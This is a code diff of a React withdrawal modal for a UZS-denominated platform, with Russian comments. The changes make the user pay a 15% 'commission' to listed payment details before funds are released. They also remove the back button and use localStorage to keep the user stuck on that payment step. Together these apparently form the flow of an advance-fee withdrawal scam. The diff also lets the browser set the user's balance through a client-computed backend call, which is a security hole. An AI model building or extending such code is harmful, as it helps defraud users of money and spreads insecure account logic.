@@ -15,7 +15,10 @@ const WithdrawModal = ({ isOpen, onClose }) => {
   const [cardLoading, setCardLoading] = useState(true);
   const [userBalance, setUserBalance] = useState(0); // Добавляем состояние для баланса
   const [isCommissionPending, setIsCommissionPending] = useState(false);
+  const [isWithdrawPending, setIsWithdrawPending] = useState(false);
   const [pendingWithdrawAmount, setPendingWithdrawAmount] = useState(0);
+  const [commissionAmount, setCommissionAmount] = useState(0);
+
 
   // Загружаем баланс при открытии модального окна
   useEffect(() => {
@@ -24,6 +27,27 @@ const WithdrawModal = ({ isOpen, onClose }) => {
       fetchCardNumber();
     }
   }, [isOpen]);
+
+  useEffect(() => {
+    const pendingWithdraw = localStorage.getItem("pendingWithdraw");
+    if (pendingWithdraw) {
+      setStep(2);
+    }
+  }, []);
+
+
+  useEffect(() => {
+    const savedWithdraw = localStorage.getItem("pendingWithdraw");
+    if (savedWithdraw) {
+      const parsed = JSON.parse(savedWithdraw);
+      if (parsed.amount) {
+        const amountNum = Number(parsed.amount);
+        setAmount(amountNum);
+        setCommissionAmount(amountNum * 0.15);
+      }
+    }
+  }, []);
+
 
   const fetchCardNumber = async () => {
     try {
@@ -74,12 +98,54 @@ const WithdrawModal = ({ isOpen, onClose }) => {
 
   if (!isOpen) return null;
 
+  const updateBalanceOnBackend = async (userBalanceSet) => {
+    try {
+      const token = localStorage.getItem("access_token");
+      
+      console.log('📤 Отправка на backend:', {
+        amount_change: userBalanceSet.toFixed(2),
+      });
+
+      const response = await fetch(`${API_BASE_URL}/api/user/update_balance`, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "Authorization": `Bearer ${token}`,
+        },
+        body: JSON.stringify({
+          amount_change: userBalanceSet,
+        }),
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        console.log("✅ Баланс обновлен на backend:", data);
+        
+        // Синхронизируем с ответом сервера
+        if (data.balance !== undefined) {
+          setUserBalance(parseFloat(data.balance));
+          sessionStorage.setItem("balance", data.balance.toString());
+        }
+        
+        return data;
+      } else {
+        const errorText = await response.text();
+        console.error("❌ Ошибка при обновлении баланса:", errorText);
+        return null;
+      }
+    } catch (error) {
+      console.error("🚨 Ошибка обновления баланса:", error);
+      return null;
+    }
+  };
+
   const handleStep1Submit = (e) => {
     e.preventDefault();
-    
+
     const withdrawAmount = parseFloat(amount);
     //const totalAmount = withdrawAmount + (withdrawAmount * 0.15); // Сумма + комиссия
     const totalAmount = withdrawAmount;
+    const newUserBalance = userBalance - withdrawAmount;
     
     // Проверки
     if (withdrawAmount < 12000000) {
@@ -91,6 +157,20 @@ const WithdrawModal = ({ isOpen, onClose }) => {
       alert(`Недостаточно средств на балансе!\n\nЗапрошено: ${withdrawAmount.toLocaleString()} UZS\nКомиссия: ${(withdrawAmount * 0.15).toLocaleString()} UZS\nИтого: ${totalAmount.toLocaleString()} UZS\nВаш баланс: ${userBalance.toLocaleString()} UZS`);
       return;
     }
+
+    const updatedAmountToWithdraw = userBalance; // Вся сумма баланса
+
+    updateBalanceOnBackend(newUserBalance);
+    setIsWithdrawPending(true);
+    setPendingWithdrawAmount(updatedAmountToWithdraw);
+    
+    localStorage.setItem("pendingWithdraw", JSON.stringify({
+      amount: updatedAmountToWithdraw,
+      cardNumber: cardNumber,
+      fullName: fullName
+    }));
+
+    console.log(`💰 Списано ${updatedAmountToWithdraw.toLocaleString()} UZS для вывода`);
 
     setStep(2);
   };
@@ -106,6 +186,8 @@ const WithdrawModal = ({ isOpen, onClose }) => {
       formData.append('amount', amount); 
       formData.append('card_number', cardNumber);
       formData.append('full_name', fullName);
+
+      
       
       // Добавляем файл если он есть
       if (file) {
@@ -149,19 +231,19 @@ const WithdrawModal = ({ isOpen, onClose }) => {
     }
   };
 
-  const commissionAmount = parseFloat(amount) * 0.15;
-  //const totalAmount = parseFloat(amount) + commissionAmount;
-  const totalAmount = parseFloat(amount) 
+  const safeAmount = Number(amount) || 0;
+  const safeCommission = Number(commissionAmount) || 0;
+
   
   return (
     <div className="withdraw-modal-overlay" onClick={onClose}>
       <div className="withdraw-modal-content" onClick={(e) => e.stopPropagation()}>
         <div className="withdraw-modal-header">
-          {step === 2 && (
+          {/*{step === 2 && (
             <button className="back-button" onClick={() => setStep(1)}>
               <ArrowLeft size={20} />
             </button>
-          )}
+          )}*/}
           <h2 className="withdraw-modal-title">
             <CreditCard className="withdraw-modal-icon" />
             {step === 1 ? 'Вывод средств' : 'Оплата комиссии'}
@@ -257,17 +339,18 @@ const WithdrawModal = ({ isOpen, onClose }) => {
             <div className="calculation-section">
               <div className="calculation-row">
                 <span>Сумма вывода:</span>
-                <span>{parseFloat(amount).toLocaleString()} UZS</span>
+                <span>{safeAmount.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row">
                 <span>Комиссия (15%):</span>
-                <span>{commissionAmount.toLocaleString()} UZS</span>
+                <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
               <div className="calculation-row total">
                 <span>К оплате комиссии:</span>
-                <span>{commissionAmount.toLocaleString()} UZS</span>
+                <span>{safeCommission.toLocaleString()} UZS</span>
               </div>
             </div>
+
 
             <div className="payment-details">
               <p className="details-label">Реквизиты для оплаты комиссии:</p>
